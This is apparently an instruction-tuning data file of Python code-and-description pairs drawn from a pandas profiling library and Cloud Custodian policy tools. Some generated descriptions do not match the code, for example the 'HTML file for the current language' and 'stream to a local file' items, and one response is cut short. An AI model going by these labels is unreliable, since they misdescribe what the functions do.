{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ncompute summary statistics of a date variable.", "response": "def describe_date_1d(series):\n    \"\"\"Compute summary statistics of a date (`TYPE_DATE`) variable (a Series).\n\n    Also create histograms (mini an full) of its distribution.\n\n    Parameters\n    ----------\n    series : Series\n        The variable to describe.\n\n    Returns\n    -------\n    Series\n        The description of the variable as a Series with index being stats keys.\n    \"\"\"\n    stats = dict()\n    stats['type'] = base.TYPE_DATE\n    stats['min'] = series.min()\n    stats['max'] = series.max()\n    stats['range'] = stats['max'] - stats['min']\n    # Histograms\n    stats['histogram'] = histogram(series)\n    stats['mini_histogram'] = mini_histogram(series)\n    return pd.Series(stats, name=series.name)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ncomputing summary statistics of a categorical variable.", "response": "def describe_categorical_1d(series):\n    \"\"\"Compute summary statistics of a categorical (`TYPE_CAT`) variable (a Series).\n\n    Parameters\n    ----------\n    series : Series\n        The variable to describe.\n\n    Returns\n    -------\n    Series\n        The description of the variable as a Series with index being stats keys.\n    \"\"\"\n    # Only run if at least 1 non-missing value\n    value_counts, distinct_count = base.get_groupby_statistic(series)\n    top, freq = value_counts.index[0], value_counts.iloc[0]\n    names = []\n    result = []\n\n    if base.get_vartype(series) == base.TYPE_CAT:\n        names += ['top', 'freq', 'type']\n        result += [top, freq, base.TYPE_CAT]\n\n    return pd.Series(result, index=names, name=series.name)"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ncomputes summary statistics of a boolean variable.", "response": "def describe_boolean_1d(series):\n    \"\"\"Compute summary statistics of a boolean (`TYPE_BOOL`) variable (a Series).\n\n    Parameters\n    ----------\n    series : Series\n        The variable to describe.\n\n    Returns\n    -------\n    Series\n        The description of the variable as a Series with index being stats keys.\n    \"\"\"\n    value_counts, distinct_count = base.get_groupby_statistic(series)\n    top, freq = value_counts.index[0], value_counts.iloc[0]\n    # The mean of boolean is an interesting information\n    mean = series.mean()\n    names = []\n    result = []\n    names += ['top', 'freq', 'type', 'mean']\n    result += [top, freq, base.TYPE_BOOL, mean]\n\n    return pd.Series(result, index=names, name=series.name)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ncomputing summary statistics of a constant variable.", "response": "def describe_constant_1d(series):\n    \"\"\"Compute summary statistics of a constant (`S_TYPE_CONST`) variable (a Series).\n\n    Parameters\n    ----------\n    series : Series\n        The variable to describe.\n\n    Returns\n    -------\n    Series\n        The description of the variable as a Series with index being stats keys.\n    \"\"\"\n    return pd.Series([base.S_TYPE_CONST], index=['type'], name=series.name)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef describe_unique_1d(series):\n    return pd.Series([base.S_TYPE_UNIQUE], index=['type'], name=series.name)", "response": "Compute summary statistics of a unique variable."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef describe_supported(series, **kwargs):\n    leng = len(series)  # number of observations in the Series\n    count = series.count()  # number of non-NaN observations in the Series\n    n_infinite = count - series.count()  # number of infinte observations in the Series\n\n    value_counts, distinct_count = base.get_groupby_statistic(series)\n    if count > distinct_count > 1:\n        mode = series.mode().iloc[0]\n    else:\n        mode = series[0]\n\n    results_data = {'count': count,\n                    'distinct_count': distinct_count,\n                    'p_missing': 1 - count * 1.0 / leng,\n                    'n_missing': leng - count,\n                    'p_infinite': n_infinite * 1.0 / leng,\n                    'n_infinite': n_infinite,\n                    'is_unique': distinct_count == leng,\n                    'mode': mode,\n                    'p_unique': distinct_count * 1.0 / leng}\n    try:\n        # pandas 0.17 onwards\n        results_data['memorysize'] = series.memory_usage()\n    except:\n        results_data['memorysize'] = 0\n\n    return pd.Series(results_data, name=series.name)", "response": "Compute summary statistics of a supported variable."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef describe_unsupported(series, **kwargs):\n    leng = len(series)  # number of observations in the Series\n    count = series.count()  # number of non-NaN observations in the Series\n    n_infinite = count - series.count()  # number of infinte observations in the Series\n\n    results_data = {'count': count,\n                    'p_missing': 1 - count * 1.0 / leng,\n                    'n_missing': leng - count,\n                    'p_infinite': n_infinite * 1.0 / leng,\n                    'n_infinite': n_infinite,\n                    'type': base.S_TYPE_UNSUPPORTED}\n\n    try:\n        # pandas 0.17 onwards\n        results_data['memorysize'] = series.memory_usage()\n    except:\n        results_data['memorysize'] = 0\n\n    return pd.Series(results_data, name=series.name)", "response": "Compute summary statistics of an unsupported variable."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ncompute summary statistics of a single 1D variable.", "response": "def describe_1d(data, **kwargs):\n    \"\"\"Compute summary statistics of a variable (a Series).\n\n    The description is different according to the type of the variable.\n    However a set of common stats is also computed.\n\n    Parameters\n    ----------\n    series : Series\n        The variable to describe.\n\n    Returns\n    -------\n    Series\n        The description of the variable as a Series with index being stats keys.\n    \"\"\"\n\n    # Replace infinite values with NaNs to avoid issues with\n    # histograms later.\n    data.replace(to_replace=[np.inf, np.NINF, np.PINF], value=np.nan, inplace=True)\n\n    result = pd.Series({}, name=data.name)\n\n    vartype = base.get_vartype(data)\n\n    if vartype == base.S_TYPE_UNSUPPORTED:\n        result = result.append(describe_unsupported(data))\n    else:\n        result = result.append(describe_supported(data))\n\n        if vartype == base.S_TYPE_CONST:\n            result = result.append(describe_constant_1d(data))\n        elif vartype == base.TYPE_BOOL:\n            result = result.append(describe_boolean_1d(data))\n        elif vartype == base.TYPE_NUM:\n            result = result.append(describe_numeric_1d(data, **kwargs))\n        elif vartype == base.TYPE_DATE:\n            result = result.append(describe_date_1d(data))\n        elif vartype == base.S_TYPE_UNIQUE:\n            result = result.append(describe_unique_1d(data))\n        else:\n            # TYPE_CAT\n            result = result.append(describe_categorical_1d(data))\n\n    return result"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ngenerates a dict containing summary statistics for a given dataset stored as a pandas. DataFrame.", "response": "def describe(df, bins=10, check_correlation=True, correlation_threshold=0.9, correlation_overrides=None, check_recoded=False, pool_size=multiprocessing.cpu_count(), **kwargs):\n    \"\"\"Generates a dict containing summary statistics for a given dataset stored as a pandas `DataFrame`.\n\n    Used has is it will output its content as an HTML report in a Jupyter notebook.\n\n    Parameters\n    ----------\n    df : DataFrame\n        Data to be analyzed\n    bins : int\n        Number of bins in histogram.\n        The default is 10.\n    check_correlation : boolean\n        Whether or not to check correlation.\n        It's `True` by default.\n    correlation_threshold: float\n        Threshold to determine if the variable pair is correlated.\n        The default is 0.9.\n    correlation_overrides : list\n        Variable names not to be rejected because they are correlated.\n        There is no variable in the list (`None`) by default.\n    check_recoded : boolean\n        Whether or not to check recoded correlation (memory heavy feature).\n        Since it's an expensive computation it can be activated for small datasets.\n        `check_correlation` must be true to disable this check.\n        It's `False` by default.\n    pool_size : int\n        Number of workers in thread pool\n        The default is equal to the number of CPU.\n\n    Returns\n    -------\n    dict\n        Containing the following keys:\n            * table: general statistics on the dataset\n            * variables: summary statistics for each variable\n            * freq: frequency table\n\n    Notes:\n    ------\n        * The section dedicated to check the correlation should be externalized\n    \"\"\"\n\n    if not isinstance(df, pd.DataFrame):\n        raise TypeError(\"df must be of type pandas.DataFrame\")\n    if df.empty:\n        raise ValueError(\"df can not be empty\")\n\n    try:\n        # reset matplotlib style before use\n        # Fails in matplotlib 1.4.x so plot might look bad\n        matplotlib.style.use(\"default\")\n    except:\n        pass\n\n    try:\n        # Ignore FutureWarning\n        from pandas.plotting import register_matplotlib_converters\n        register_matplotlib_converters()\n    except:\n        pass\n\n    matplotlib.style.use(resource_filename(__name__, \"pandas_profiling.mplstyle\"))\n\n    # Clearing the cache before computing stats\n    base.clear_cache()\n\n    if not pd.Index(np.arange(0, len(df))).equals(df.index):\n        # Treat index as any other column\n        df = df.reset_index()\n\n    kwargs.update({'bins': bins})\n    # Describe all variables in a univariate way\n    if pool_size == 1:\n        local_multiprocess_func = partial(multiprocess_func, **kwargs)\n        ldesc = {col: s for col, s in map(local_multiprocess_func, df.iteritems())}\n    else:\n        pool = multiprocessing.Pool(pool_size)\n        local_multiprocess_func = partial(multiprocess_func, **kwargs)\n        ldesc = {col: s for col, s in pool.map(local_multiprocess_func, df.iteritems())}\n        pool.close()\n\n    # Get correlations\n    dfcorrPear = df.corr(method=\"pearson\")\n    dfcorrSpear = df.corr(method=\"spearman\")\n\n    # Check correlations between variable\n    if check_correlation is True:\n        ''' TODO: corr(x,y) > 0.9 and corr(y,z) > 0.9 does not imply corr(x,z) > 0.9\n        If x~y and y~z but not x~z, it would be better to delete only y\n        Better way would be to find out which variable causes the highest increase in multicollinearity.\n        '''\n        corr = dfcorrPear.copy()\n        for x, corr_x in corr.iterrows():\n            if correlation_overrides and x in correlation_overrides:\n                continue\n\n            for y, corr in corr_x.iteritems():\n                if x == y: break\n\n                if corr > correlation_threshold:\n                    ldesc[x] = pd.Series(['CORR', y, corr], index=['type', 'correlation_var', 'correlation'])\n\n        if check_recoded:\n            categorical_variables = [(name, data) for (name, data) in df.iteritems() if base.get_vartype(data)=='CAT']\n            for (name1, data1), (name2, data2) in itertools.combinations(categorical_variables, 2):\n                if correlation_overrides and name1 in correlation_overrides:\n                    continue\n\n                confusion_matrix=pd.crosstab(data1,data2)\n                if confusion_matrix.values.diagonal().sum() == len(df):\n                    ldesc[name1] = pd.Series(['RECODED', name2], index=['type', 'correlation_var'])\n\n    # Convert ldesc to a DataFrame\n    names = []\n    ldesc_indexes = sorted([x.index for x in ldesc.values()], key=len)\n    for idxnames in ldesc_indexes:\n        for name in idxnames:\n            if name not in names:\n                names.append(name)\n    variable_stats = pd.concat(ldesc, join_axes=pd.Index([names]), axis=1)\n    variable_stats.columns.names = df.columns.names\n\n    # General statistics\n    table_stats = {}\n\n    table_stats['n'] = len(df)\n    table_stats['nvar'] = len(df.columns)\n    table_stats['total_missing'] = variable_stats.loc['n_missing'].sum() / (table_stats['n'] * table_stats['nvar'])\n    unsupported_columns = variable_stats.transpose()[variable_stats.transpose().type != base.S_TYPE_UNSUPPORTED].index.tolist()\n    table_stats['n_duplicates'] = sum(df.duplicated(subset=unsupported_columns)) if len(unsupported_columns) > 0 else 0\n\n    memsize = df.memory_usage(index=True).sum()\n    table_stats['memsize'] = formatters.fmt_bytesize(memsize)\n    table_stats['recordsize'] = formatters.fmt_bytesize(memsize / table_stats['n'])\n\n    table_stats.update({k: 0 for k in (\"NUM\", \"DATE\", \"CONST\", \"CAT\", \"UNIQUE\", \"CORR\", \"RECODED\", \"BOOL\", \"UNSUPPORTED\")})\n    table_stats.update(dict(variable_stats.loc['type'].value_counts()))\n    table_stats['REJECTED'] = table_stats['CONST'] + table_stats['CORR'] + table_stats['RECODED']\n\n    return {\n        'table': table_stats,\n        'variables': variable_stats.T,\n        'freq': {k: (base.get_groupby_statistic(df[k])[0] if variable_stats[k].type != base.S_TYPE_UNSUPPORTED else None) for k in df.columns},\n        'correlations': {'pearson': dfcorrPear, 'spearman': dfcorrSpear}\n    }"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _plot_histogram(series, bins=10, figsize=(6, 4), facecolor='#337ab7'):\n    if base.get_vartype(series) == base.TYPE_DATE:\n        # TODO: These calls should be merged\n        fig = plt.figure(figsize=figsize)\n        plot = fig.add_subplot(111)\n        plot.set_ylabel('Frequency')\n        try:\n            plot.hist(series.dropna().values, facecolor=facecolor, bins=bins)\n        except TypeError: # matplotlib 1.4 can't plot dates so will show empty plot instead\n            pass\n    else:\n        plot = series.plot(kind='hist', figsize=figsize,\n                           facecolor=facecolor,\n                           bins=bins)  # TODO when running on server, send this off to a different thread\n    return plot", "response": "Plot a histogram from the data and return the AxesSubplot object."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef histogram(series, **kwargs):\n    imgdata = BytesIO()\n    plot = _plot_histogram(series, **kwargs)\n    plot.figure.subplots_adjust(left=0.15, right=0.95, top=0.9, bottom=0.1, wspace=0, hspace=0)\n    plot.figure.savefig(imgdata)\n    imgdata.seek(0)\n    result_string = 'data:image/png;base64,' + quote(base64.b64encode(imgdata.getvalue()))\n    # TODO Think about writing this to disk instead of caching them in strings\n    plt.close(plot.figure)\n    return result_string", "response": "Plot an histogram of the data."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nplot a small histogram of the data.", "response": "def mini_histogram(series, **kwargs):\n    \"\"\"Plot a small (mini) histogram of the data.\n\n    Parameters\n    ----------\n    series: Series\n        The data to plot.\n\n    Returns\n    -------\n    str\n        The resulting image encoded as a string.\n    \"\"\"\n    imgdata = BytesIO()\n    plot = _plot_histogram(series, figsize=(2, 0.75), **kwargs)\n    plot.axes.get_yaxis().set_visible(False)\n\n    if LooseVersion(matplotlib.__version__) <= '1.5.9':\n        plot.set_axis_bgcolor(\"w\")\n    else:\n        plot.set_facecolor(\"w\")\n\n    xticks = plot.xaxis.get_major_ticks()\n    for tick in xticks[1:-1]:\n        tick.set_visible(False)\n        tick.label.set_visible(False)\n    for tick in (xticks[0], xticks[-1]):\n        tick.label.set_fontsize(8)\n    plot.figure.subplots_adjust(left=0.15, right=0.85, top=1, bottom=0.35, wspace=0, hspace=0)\n    plot.figure.savefig(imgdata)\n    imgdata.seek(0)\n    result_string = 'data:image/png;base64,' + quote(base64.b64encode(imgdata.getvalue()))\n    plt.close(plot.figure)\n    return result_string"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef correlation_matrix(corrdf, title, **kwargs):\n    imgdata = BytesIO()\n    fig_cor, axes_cor = plt.subplots(1, 1)\n    labels = corrdf.columns\n    matrix_image = axes_cor.imshow(corrdf, vmin=-1, vmax=1, interpolation=\"nearest\", cmap='bwr')\n    plt.title(title, size=18)\n    plt.colorbar(matrix_image)\n    axes_cor.set_xticks(np.arange(0, corrdf.shape[0], corrdf.shape[0] * 1.0 / len(labels)))\n    axes_cor.set_yticks(np.arange(0, corrdf.shape[1], corrdf.shape[1] * 1.0 / len(labels)))\n    axes_cor.set_xticklabels(labels, rotation=90)\n    axes_cor.set_yticklabels(labels)\n\n    matrix_image.figure.savefig(imgdata, bbox_inches='tight')\n    imgdata.seek(0)\n    result_string = 'data:image/png;base64,' + quote(base64.b64encode(imgdata.getvalue()))\n    plt.close(matrix_image.figure)\n    return result_string", "response": "Plot image of a matrix correlation."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ncalculates value counts and distinct count of a variable.", "response": "def get_groupby_statistic(data):\n    \"\"\"Calculate value counts and distinct count of a variable (technically a Series).\n\n    The result is cached by column name in a global variable to avoid recomputing.\n\n    Parameters\n    ----------\n    data : Series\n        The data type of the Series.\n\n    Returns\n    -------\n    list\n        value count and distinct count\n    \"\"\"\n    if data.name is not None and data.name in _VALUE_COUNTS_MEMO:\n        return _VALUE_COUNTS_MEMO[data.name]\n\n    value_counts_with_nan = data.value_counts(dropna=False)\n    value_counts_without_nan = value_counts_with_nan.reset_index().dropna().set_index('index').iloc[:,0]\n    distinct_count_with_nan = value_counts_with_nan.count()\n\n    # When the inferred type of the index is just \"mixed\" probably the types within the series are tuple, dict, list and so on...\n    if value_counts_without_nan.index.inferred_type == \"mixed\":\n        raise TypeError('Not supported mixed type')\n\n    result = [value_counts_without_nan, distinct_count_with_nan]\n\n    if data.name is not None:\n        _VALUE_COUNTS_MEMO[data.name] = result\n\n    return result"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ninfer the type of a variable.", "response": "def get_vartype(data):\n    \"\"\"Infer the type of a variable (technically a Series).\n\n    The types supported are split in standard types and special types.\n\n    Standard types:\n        * Categorical (`TYPE_CAT`): the default type if no other one can be determined\n        * Numerical (`TYPE_NUM`): if it contains numbers\n        * Boolean (`TYPE_BOOL`): at this time only detected if it contains boolean values, see todo\n        * Date (`TYPE_DATE`): if it contains datetime\n\n    Special types:\n        * Constant (`S_TYPE_CONST`): if all values in the variable are equal\n        * Unique (`S_TYPE_UNIQUE`): if all values in the variable are different\n        * Unsupported (`S_TYPE_UNSUPPORTED`): if the variable is unsupported\n\n     The result is cached by column name in a global variable to avoid recomputing.\n\n    Parameters\n    ----------\n    data : Series\n        The data type of the Series.\n\n    Returns\n    -------\n    str\n        The data type of the Series.\n\n    Notes\n    ----\n        * Should improve verification when a categorical or numeric field has 3 values, it could be a categorical field\n        or just a boolean with NaN values\n        * #72: Numeric with low Distinct count should be treated as \"Categorical\"\n    \"\"\"\n    if data.name is not None and data.name in _MEMO:\n        return _MEMO[data.name]\n\n    vartype = None\n    try:\n        distinct_count = get_groupby_statistic(data)[1]\n        leng = len(data)\n\n        if distinct_count <= 1:\n            vartype = S_TYPE_CONST\n        elif pd.api.types.is_bool_dtype(data) or (distinct_count == 2 and pd.api.types.is_numeric_dtype(data)):\n            vartype = TYPE_BOOL\n        elif pd.api.types.is_numeric_dtype(data):\n            vartype = TYPE_NUM\n        elif pd.api.types.is_datetime64_dtype(data):\n            vartype = TYPE_DATE\n        elif distinct_count == leng:\n            vartype = S_TYPE_UNIQUE\n        else:\n            vartype = TYPE_CAT\n    except:\n        vartype = S_TYPE_UNSUPPORTED\n\n    if data.name is not None:\n        _MEMO[data.name] = vartype\n\n    return vartype"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ndetermine the immediate parent boolean operator for a filter", "response": "def get_block_operator(self):\n        \"\"\"Determine the immediate parent boolean operator for a filter\"\"\"\n        # Top level operator is `and`\n        block_stack = ['and']\n        for f in self.manager.iter_filters(block_end=True):\n            if f is None:\n                block_stack.pop()\n                continue\n            if f.type in ('and', 'or', 'not'):\n                block_stack.append(f.type)\n            if f == self:\n                break\n        return block_stack[-1]"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _validate_resource_count(self):\n        for field in ('op', 'value'):\n            if field not in self.data:\n                raise PolicyValidationError(\n                    \"Missing '%s' in value filter %s\" % (field, self.data))\n\n        if not (isinstance(self.data['value'], int) or\n                isinstance(self.data['value'], list)):\n            raise PolicyValidationError(\n                \"`value` must be an integer in resource_count filter %s\" % self.data)\n\n        # I don't see how to support regex for this?\n        if self.data['op'] not in OPERATORS or self.data['op'] in {'regex', 'regex-case'}:\n            raise PolicyValidationError(\n                \"Invalid operator in value filter %s\" % self.data)\n\n        return self", "response": "Specific validation for resource_count type"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef load_manifest_file(client, bucket, schema, versioned, ifilters, key_info):\n    # To avoid thundering herd downloads, we do an immediate yield for\n    # interspersed i/o\n    yield None\n\n    # Inline these values to avoid the local var lookup, they are constants\n    # rKey = schema['Key'] # 1\n    # rIsLatest = schema['IsLatest'] # 3\n    # rVersionId = schema['VersionId'] # 2\n\n    with tempfile.NamedTemporaryFile() as fh:\n        client.download_fileobj(Bucket=bucket, Key=key_info['key'], Fileobj=fh)\n        fh.seek(0)\n        reader = csv.reader(gzip.GzipFile(fileobj=fh, mode='r'))\n        for key_set in chunks(reader, 1000):\n            keys = []\n            for kr in key_set:\n                k = kr[1]\n                if inventory_filter(ifilters, schema, kr):\n                    continue\n                k = unquote_plus(k)\n                if versioned:\n                    if kr[3] == 'true':\n                        keys.append((k, kr[2], True))\n                    else:\n                        keys.append((k, kr[2]))\n                else:\n                    keys.append(k)\n            yield keys", "response": "Given an inventory csv file return an iterator over keys\n   "}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef load_bucket_inventory(\n        client, inventory_bucket, inventory_prefix, versioned, ifilters):\n    \"\"\"Given an inventory location for a bucket, return an iterator over keys\n\n    on the most recent delivered manifest.\n    \"\"\"\n    now = datetime.datetime.now()\n    key_prefix = \"%s/%s\" % (inventory_prefix, now.strftime('%Y-%m-'))\n    keys = client.list_objects(\n        Bucket=inventory_bucket, Prefix=key_prefix).get('Contents', [])\n    keys = [k['Key'] for k in keys if k['Key'].endswith('.json')]\n    keys.sort()\n    if not keys:\n        # no manifest delivery\n        return None\n    latest_manifest = keys[-1]\n    manifest = client.get_object(Bucket=inventory_bucket, Key=latest_manifest)\n    manifest_data = json.load(manifest['Body'])\n\n    # schema as column name to column index mapping\n    schema = dict([(k, i) for i, k in enumerate(\n        [n.strip() for n in manifest_data['fileSchema'].split(',')])])\n\n    processor = functools.partial(\n        load_manifest_file, client, inventory_bucket,\n        schema, versioned, ifilters)\n    generators = map(processor, manifest_data.get('files', ()))\n    return random_chain(generators)", "response": "Given an inventory location for a bucket return an iterator over keys\n    on the most recent delivered manifest."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nchecks a bucket for a named inventory and return the destination.", "response": "def get_bucket_inventory(client, bucket, inventory_id):\n    \"\"\"Check a bucket for a named inventory, and return the destination.\"\"\"\n    inventories = client.list_bucket_inventory_configurations(\n        Bucket=bucket).get('InventoryConfigurationList', [])\n    inventories = {i['Id']: i for i in inventories}\n    found = fnmatch.filter(inventories, inventory_id)\n    if not found:\n        return None\n\n    i = inventories[found.pop()]\n    s3_info = i['Destination']['S3BucketDestination']\n    return {'bucket': s3_info['Bucket'].rsplit(':')[-1],\n            'prefix': \"%s/%s/%s\" % (s3_info['Prefix'], bucket, i['Id'])}"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ncreating a new HTML file for the current language.", "response": "def create_html_file(config):\n    \"\"\" You can customize the automated documentation by altering\n        the code directly in this script or the associated jinja2 template\n    \"\"\"\n    logging.debug(\"Starting create_html_file\")\n    logging.debug(\n        \"\\tjinja2_template_file = {}\"\n        .format(config['jinja2_template_filename']))\n    logging.debug(\n        \"\\ttrendered_filename = {}\"\n        .format(config['rendered_filename']))\n\n    ts = time.time()\n    timestamp = datetime.datetime.utcfromtimestamp(ts).strftime(\n        '%Y-%m-%d %H:%M:%S')\n    script_path = os.path.dirname(os.path.abspath(__file__))\n    rendered_file_path = os.path.join(\n        script_path, config['rendered_filename'])\n    environment = jinja2.Environment(\n        loader=jinja2.FileSystemLoader(script_path))\n\n    environment_column = True if config['environment_tags'] else False\n\n    render_vars = {\n        \"timestamp\": timestamp,\n        \"c7n_data\": c7n_data,\n        \"environment_column\": environment_column,\n        \"environment_tags\": config['environment_tags']\n    }\n\n    with open(rendered_file_path, \"w\") as result_file:\n        result_file.write(\n            environment.get_template(config['jinja2_template_filename'])\n            .render(render_vars))\n\n    logging.debug(\"File created: %s\", rendered_file_path)\n\n    return rendered_file_path"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get_file_url(path, config):\n    file_url_regex = re.compile(config['file_url_regex'])\n    new_path = re.sub(file_url_regex, config['file_url_base'], path)\n    return new_path", "response": "Update this function to help build the link to your file\n   "}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef gather_file_data(config):\n    file_regex = re.compile(config['file_regex'])\n    category_regex = re.compile(config['category_regex'])\n    policies = {}\n\n    for root, dirs, files in os.walk(config['c7n_policy_directory']):\n        for file in files:\n            if file_regex.match(file):\n                file_path = root + '/' + file\n                logging.debug('Processing file %s', file_path)\n                with open(file_path, 'r') as stream:\n                    try:\n                        if category_regex.search(file_path):\n                            category = 'Security & Governance'\n                        else:\n                            category = 'Cost Controls'\n\n                        policies = yaml.load(stream)\n                        for policy in policies['policies']:\n                            logging.debug(\n                                'Processing policy %s', policy['name'])\n                            policy['file_url'] = get_file_url(\n                                file_path, config)\n                            resource_type = policy['resource']\n                            if category not in c7n_data:\n                                c7n_data[category] = {}\n                            if resource_type not in c7n_data[category]:\n                                c7n_data[category][resource_type] = []\n                            c7n_data[category][resource_type].append(policy)\n                    except yaml.YAMLError as exc:\n                        logging.error(exc)", "response": "Gather policy information from files\n   "}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nupload html file to S3", "response": "def upload_to_s3(file_path, config):\n    \"\"\" Upload html file to S3\n    \"\"\"\n    logging.info(\"Uploading file to S3 bucket: %s\", config['s3_bucket_name'])\n    s3 = boto3.resource('s3')\n    s3_filename = config['s3_bucket_path'] + config['rendered_filename']\n    s3.Bucket(config['s3_bucket_name']).upload_file(\n        file_path, s3_filename, ExtraArgs={\n            'ContentType': 'text/html', 'ACL': 'public-read'})"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef github_repos(organization, github_url, github_token):\n    # Get github repos\n    headers = {\"Authorization\": \"token {}\".format(github_token)}\n    next_cursor = None\n\n    while next_cursor is not False:\n        params = {'query': query, 'variables': {\n            'organization': organization, 'cursor': next_cursor}}\n        response = requests.post(github_url, headers=headers, json=params)\n        result = response.json()\n        if response.status_code != 200 or 'errors' in result:\n            raise ValueError(\"Github api error %s\" % (\n                response.content.decode('utf8'),))\n\n        repos = jmespath.search(\n            'data.organization.repositories.edges[].node', result)\n        for r in repos:\n            yield r\n        page_info = jmespath.search(\n            'data.organization.repositories.pageInfo', result)\n        if page_info:\n            next_cursor = (page_info['hasNextPage'] and\n                           page_info['endCursor'] or False)\n        else:\n            next_cursor = False", "response": "Return all github repositories in an organization."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nstream changes for repos in a GitHub organization.", "response": "def org_stream(ctx, organization, github_url, github_token, clone_dir,\n               verbose, filter, exclude, stream_uri, assume):\n    \"\"\"Stream changes for repos in a GitHub organization.\n    \"\"\"\n    logging.basicConfig(\n        format=\"%(asctime)s: %(name)s:%(levelname)s %(message)s\",\n        level=(verbose and logging.DEBUG or logging.INFO))\n\n    log.info(\"Checkout/Update org repos\")\n    repos = ctx.invoke(\n        org_checkout,\n        organization=organization,\n        github_url=github_url,\n        github_token=github_token,\n        clone_dir=clone_dir,\n        verbose=verbose,\n        filter=filter,\n        exclude=exclude)\n\n    log.info('Streaming org changes')\n    change_count = 0\n    for r in repos:\n        change_count += ctx.invoke(\n            stream,\n            repo_uri=r,\n            stream_uri=stream_uri,\n            verbose=verbose,\n            assume=assume)\n    log.info(\"Streamed %d org changes\", change_count)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef diff(repo_uri, source, target, output, verbose):\n    logging.basicConfig(\n        format=\"%(asctime)s: %(name)s:%(levelname)s %(message)s\",\n        level=(verbose and logging.DEBUG or logging.INFO))\n    logging.getLogger('botocore').setLevel(logging.WARNING)\n\n    if repo_uri is None:\n        repo_uri = pygit2.discover_repository(os.getcwd())\n\n    repo = pygit2.Repository(repo_uri)\n    load_resources()\n\n    # If on master show diff between last commit to current head\n    if repo.head.shorthand == 'master':\n        if source is None:\n            source = 'master@{1}'\n        if target is None:\n            target = 'master'\n    # Else show difference between master and current head\n    elif target is None:\n        target = repo.head.shorthand\n    if source is None:\n        source = 'master'\n\n    policy_repo = PolicyRepo(repo_uri, repo)\n    changes = list(policy_repo.delta_commits(\n        repo.revparse_single(source), repo.revparse_single(target)))\n    output.write(\n        yaml.safe_dump({\n            'policies': [c.policy.data for c in changes\n                         if c.kind != ChangeType.REMOVE]}).encode('utf8'))", "response": "Policy diff between two arbitrary revisions."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nstreaming git history policy changes to a local file.", "response": "def stream(repo_uri, stream_uri, verbose, assume, sort, before=None, after=None):\n    \"\"\"Stream git history policy changes to destination.\n\n\n    Default stream destination is a summary of the policy changes to stdout, one\n    per line. Also supported for stdout streaming is `jsonline`.\n\n    AWS Kinesis and SQS destinations are specified by providing the ARN.\n\n    Database destinations are supported by providing a sqlalchemy DSN. Note\n    SQLAlchemy and db drivers must be installed separately as they an optional\n    dependency.\n\n    When using database destinations, streaming defaults to incremental.\n    \"\"\"\n    logging.basicConfig(\n        format=\"%(asctime)s: %(name)s:%(levelname)s %(message)s\",\n        level=(verbose and logging.DEBUG or logging.INFO))\n    logging.getLogger('botocore').setLevel(logging.WARNING)\n\n    if before:\n        before = parse(before)\n    if after:\n        after = parse(after)\n    if sort:\n        sort = six.moves.reduce(operator.or_, [SORT_TYPE[s] for s in sort])\n\n    with contextlib.closing(TempDir().open()) as temp_dir:\n        if repo_uri is None:\n            repo_uri = pygit2.discover_repository(os.getcwd())\n            log.debug(\"Using repository %s\", repo_uri)\n        if repo_uri.startswith('http') or repo_uri.startswith('git@'):\n            log.info(\"Cloning repository: %s\", repo_uri)\n            repo = pygit2.clone_repository(repo_uri, temp_dir.path)\n        else:\n            repo = pygit2.Repository(repo_uri)\n        load_resources()\n        policy_repo = PolicyRepo(repo_uri, repo)\n        change_count = 0\n\n        with contextlib.closing(transport(stream_uri, assume)) as t:\n            if after is None and isinstance(t, IndexedTransport):\n                after = t.last()\n            for change in policy_repo.delta_stream(after=after, before=before):\n                change_count += 1\n                t.send(change)\n\n        log.info(\"Streamed %d policy repo changes\", change_count)\n    return change_count"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nreturning the named subset of policies", "response": "def select(self, names):\n        \"\"\"return the named subset of policies\"\"\"\n        return PolicyCollection(\n            [p for p in self.policies if p.name in names], self.options)"}
